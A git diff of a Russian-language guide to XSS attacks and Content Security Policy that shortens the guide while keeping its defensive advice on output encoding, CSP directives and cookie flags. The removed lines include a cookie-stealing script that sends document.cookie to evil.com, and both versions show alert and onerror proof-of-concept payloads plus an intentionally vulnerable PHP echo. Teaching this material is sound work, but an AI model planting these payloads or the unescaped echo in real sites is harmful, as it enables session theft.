@@ -1,234 +1,85 @@
-# XSS (Cross-Site Scripting) атаки и CSP
+# XSS (Cross-Site Scripting) и CSP (Content Security Policy)
 
 ## Определения
 
-**XSS (Cross-Site Scripting)** — это тип атаки на веб-приложения, при котором злоумышленник внедряет вредоносный JavaScript-код в веб-страницы, просматриваемые другими пользователями. Название образовалось от сокращения CSS (Cascading Style Sheets), чтобы избежать путаницы со стилями.
+**XSS (Cross-Site Scripting)** — это тип атаки на веб-приложения, при котором злоумышленник внедряет вредоносный JavaScript-код на страницы, просматриваемые другими пользователями. Цель — кража данных, выполнение действий от имени пользователя или изменение содержимого страницы.
 
-**CSP (Content Security Policy)** — это механизм безопасности, который позволяет веб-серверам контролировать ресурсы (скрипты, стили, изображения), которые браузер может загружать и выполнять на странице. Реализуется через HTTP-заголовок `Content-Security-Policy`.
+**CSP (Content Security Policy)** — это механизм безопасности, реализуемый через HTTP-заголовок `Content-Security-Policy`. Он позволяет контролировать, какие ресурсы (скрипты, стили, изображения) браузер может загружать и выполнять на странице, что является эффективной защитой от XSS-атак.
 
-## Типы XSS атак
+## Основные концепции
 
-### 1. Stored XSS (Хранимый/Постоянный)
+### Типы XSS-атак
 
-Вредоносный скрипт сохраняется на сервере (в базе данных, комментариях, профилях) и выполняется при просмотре зараженной страницы.
+*   **Stored XSS (Хранимый/Постоянный):** Вредоносный скрипт сохраняется на сервере (например, в комментариях) и выполняется у каждого пользователя, просматривающего страницу.
+*   **Reflected XSS (Отраженный/Непостоянный):** Скрипт передается через HTTP-запрос (чаще всего, в URL-параметре) и немедленно "отражается" в ответе сервера, исполняясь в браузере жертвы.
+*   **DOM-based XSS:** Атака происходит полностью на стороне клиента. Вредоносный код исполняется в результате небезопасной обработки данных самим JavaScript-кодом страницы (например, при использовании `element.innerHTML = location.hash`).
 
-**Пример:**
-```html
-<!-- Злоумышленник оставляет комментарий: -->
-<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
+### Последствия XSS-атак
+*   Кража сессионных cookies и токенов (`HttpOnly` флаг — частичная защита).
+*   Подмена содержимого страницы (defacing).
+*   Перенаправление на фишинговые сайты.
+*   Выполнение действий от имени пользователя (CSRF через XSS).
+*   Перехват нажатий клавиш (keylogging).
 
-<!-- Скрипт сохраняется в БД и выполняется у всех посетителей -->
-```
+### Фундаментальные принципы защиты от XSS
 
-### 2. Reflected XSS (Отраженный/Непостоянный)
+1.  **Экранирование вывода (Output Encoding):** Всегда экранируйте данные перед их вставкой в HTML, JavaScript, CSS или URL. Это основной метод защиты.
+2.  **Валидация входных данных:** Проверяйте данные на стороне сервера на соответствие ожидаемому формату и типу (белые списки).
+3.  **Использование современных фреймворков:** Фреймворки, такие как React, Vue и Angular, автоматически экранируют вывод, что значительно снижает риск XSS.
+4.  **Безопасные HTTP-заголовки:** Используйте `Content-Security-Policy` как основной рубеж защиты, а также `HttpOnly` и `Secure` флаги для cookie.
 
-Вредоносный код передается в HTTP-запросе (URL-параметры, формы) и немедленно отображается в ответе сервера без сохранения.
+### Концепции Content Security Policy (CSP)
 
-**Пример:**
-```html
-<!-- Уязвимый URL: https://example.com/search?q=<script>alert('XSS')</script> -->
-<!-- Сервер отражает параметр q в HTML без экранирования -->
-```
+CSP определяет "белый список" доверенных источников для различных типов контента.
 
-### 3. DOM-based XSS
-
-Атака происходит полностью на стороне клиента при обработке данных JavaScript-кодом (через `innerHTML`, `document.write`, `eval`).
-
-**Пример:**
-```javascript
-// Уязвимый код
-var hash = location.hash.slice(1);
-element.innerHTML = hash; // Вставка без санитизации
-
-// Атака: https://example.com/page#<img src=x onerror=alert('XSS')>
-```
-
-## Последствия XSS атак
-
-- Кража сессионных cookies и токенов аутентификации
-- Подмена содержимого страницы (defacing)
-- Перенаправление пользователей на фишинговые сайты
-- Выполнение действий от имени пользователя (CSRF через XSS)
-- Кража конфиденциальных данных со страницы
-- Майнинг криптовалюты в браузере пользователя
-- Заражение компьютера через эксплойты браузера
-
-## Защита от XSS
-
-### 1. Экранирование вывода (Output Encoding)
-
-Всегда экранируйте данные при выводе в HTML, JavaScript, CSS, URL.
-
-**Примеры экранирования:**
-```html
-<!-- HTML контекст -->
-&lt;script&gt;alert('XSS')&lt;/script&gt;
-
-<!-- JavaScript контекст -->
-\x3cscript\x3ealert('XSS')\x3c/script\x3e
-
-<!-- URL контекст -->
-%3Cscript%3Ealert('XSS')%3C/script%3E
-```
-
-### 2. Валидация входных данных
-
-```python
-# Проверка типа и формата
-if not user_id.isdigit():
-    raise ValueError("ID должен быть числом")
-
-# Белый список допустимых значений
-allowed_tags = ['p', 'br', 'strong', 'em']
-```
-
-### 3. Использование современных фреймворков
-
-React, Vue, Angular автоматически экранируют вывод по умолчанию.
-
-```jsx
-// React автоматически экранирует
-function Component({ userInput }) {
-  return <div>{userInput}</div>; // Безопасно
-}
-
-// Опасно! Используется только при необходимости
-function Dangerous({ html }) {
-  return <div dangerouslySetInnerHTML={{ __html: html }} />;
-}
-```
-
-### 4. HttpOnly и Secure флаги для Cookies
-
-```http
-Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
-```
-
-- **HttpOnly:** Запрещает JavaScript доступ к cookie через `document.cookie`
-- **Secure:** Отправлять cookie только по HTTPS
-- **SameSite:** Защита от CSRF-атак
-
-## Content Security Policy (CSP)
-
-### Базовые директивы
-
-```http
-Content-Security-Policy: 
-  default-src 'self';
-  script-src 'self' https://trusted-cdn.com;
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data: https:;
-  connect-src 'self' https://api.example.com;
-  font-src 'self' https://fonts.googleapis.com;
-  object-src 'none';
-  frame-ancestors 'none';
-  base-uri 'self';
-  form-action 'self'
-```
-
-### Ключевые директивы
-
-| Директива | Описание |
-|-----------|----------|
-| `default-src` | Значение по умолчанию для всех директив |
-| `script-src` | Источники JavaScript |
-| `style-src` | Источники CSS |
-| `img-src` | Источники изображений |
-| `connect-src` | Разрешенные endpoints для XHR, WebSocket, EventSource |
-| `font-src` | Источники шрифтов |
-| `object-src` | Источники для плагинов (Flash, Java) |
-| `frame-src` | Разрешенные iframe источники |
-| `frame-ancestors` | Кто может встраивать страницу во фрейм (защита от clickjacking) |
-| `base-uri` | Разрешенные значения для `<base>` |
-| `form-action` | Куда могут отправляться формы |
-
-### Специальные значения
-
-- `'self'` — разрешить с того же источника
-- `'none'` — запретить полностью
-- `'unsafe-inline'` — разрешить inline-скрипты/стили (небезопасно)
-- `'unsafe-eval'` — разрешить `eval()`, `setTimeout(string)` (небезопасно)
-- `'nonce-<value>'` — разрешить скрипты с определенным nonce
-- `'sha256-<hash>'` — разрешить скрипты с определенным хешем
-
-### Режим Report-Only
-
-```http
-Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
-```
-
-Политика не блокирует ресурсы, но отправляет отчеты о нарушениях. Используется для тестирования перед включением политики.
-
-### Nonce-based CSP
-
-Генерация случайного nonce для каждого запроса:
-
-```html
-<meta http-equiv="Content-Security-Policy" 
-      content="script-src 'nonce-abc123';">
-
-<script nonce="abc123">
-  // Этот скрипт разрешен
-  console.log('Hello');
-</script>
-```
+*   **Директивы:** `default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `frame-ancestors` и др.
+*   **Специальные значения:** `'self'`, `'none'`, `'unsafe-inline'`, `'unsafe-eval'`.
+*   **`Report-Only` режим:** Политика не блокирует ресурсы, а только отправляет отчеты о нарушениях. Это позволяет безопасно тестировать CSP перед внедрением.
+*   **Nonce и Hashes:** Механизмы для разрешения выполнения конкретных inline-скриптов, избегая небезопасного `'unsafe-inline'`.
 
 ## Практические сценарии
 
-### 1. Миграция на строгую CSP
+### Пример уязвимого кода (PHP)
+```php
+// Отраженный XSS
+echo "Поисковый запрос: " . $_GET['q']; 
+// URL: /search.php?q=<script>alert(1)</script>
+```
 
-1. Начните с `Content-Security-Policy-Report-Only`
-2. Анализируйте отчеты и исправляйте нарушения
-3. Перемещайте inline-скрипты во внешние файлы
-4. Для необходимых inline-скриптов используйте nonce или hash
-5. После стабилизации включите политику
+### Пример защиты (PHP)
+```php
+// Защита с помощью экранирования
+echo "Поисковый запрос: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
+```
 
-### 2. Защита legacy-приложений
+### Пример "строгой" CSP
 
+Эта политика запрещает inline-скрипты/стили и `eval`, разрешая ресурсы только с текущего домена. Это эффективная, но требующая рефакторинга кода политика.
 ```http
 Content-Security-Policy: 
   default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval';
-  style-src 'self' 'unsafe-inline';
-  upgrade-insecure-requests
+  script-src 'self';
+  style-src 'self';
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'none';
 ```
 
-Более мягкая политика для старых приложений с постепенным ужесточением.
+### Внедрение CSP на Nginx и Apache
 
-### 3. Проверка CSP
+Подробные инструкции по настройке CSP и других заголовков безопасности можно найти в следующих руководствах:
+-   **Nginx:** [Руководство по безопасности Nginx](../WebServers/Nginx/Security/nginx_security_guide.md)
+-   **Apache:** [Руководство по усилению безопасности Apache](../WebServers/Apache/apache_hardening.md)
 
-Инструменты для анализа:
-- CSP Evaluator (Google)
-- CSP Generator
-- Браузерные DevTools → Security
+### Проверка CSP
+Для анализа и генерации CSP используйте онлайн-инструменты:
+-   CSP Evaluator (от Google)
+-   CSP Generator
 
-## Дополнительные HTTP-заголовки безопасности
+## Дополнительная информация
 
-```http
-# Защита от XSS (устаревший, но все еще полезный)
-X-XSS-Protection: 1; mode=block
-
-# Защита от clickjacking
-X-Frame-Options: DENY
-
-# Предотвращение MIME-sniffing
-X-Content-Type-Options: nosniff
-
-# HTTPS строго
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-
-# Контроль реферера
-Referrer-Policy: strict-origin-when-cross-origin
-
-# Разрешения для браузерных API
-Permissions-Policy: geolocation=(), microphone=(), camera=()
-```
-
-## Резюме
-
-XSS остается одной из самых распространенных уязвимостей веб-приложений. Комплексная защита включает:
-
-1. **На уровне кода:** Экранирование вывода, валидация ввода
-2. **На уровне архитектуры:** CSP, HttpOnly cookies
-3. **На уровне инфраструктуры:** WAF для фильтрации входящего трафика
-4. **На уровне процессов:** Регулярное сканирование (SAST/DAST), code review
+-   **Комплексная защита:** XSS — это многоуровневая проблема. Эффективная защита требует комбинации мер: безопасное программирование, строгая CSP, использование WAF и регулярные проверки безопасности (SAST/DAST).
+-   **OWASP:** [Cross Site Scripting (XSS) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+-   **Связанные файлы:**
+    *   [Web Application Firewall (WAF)](./ddos_waf/waf.md) — WAF может блокировать многие известные XSS-атаки.
+    *   [SAST vs DAST](../CI-CD/DevSecOps/sast_vs_dast.md) — методы автоматического поиска уязвимостей, включая XSS.
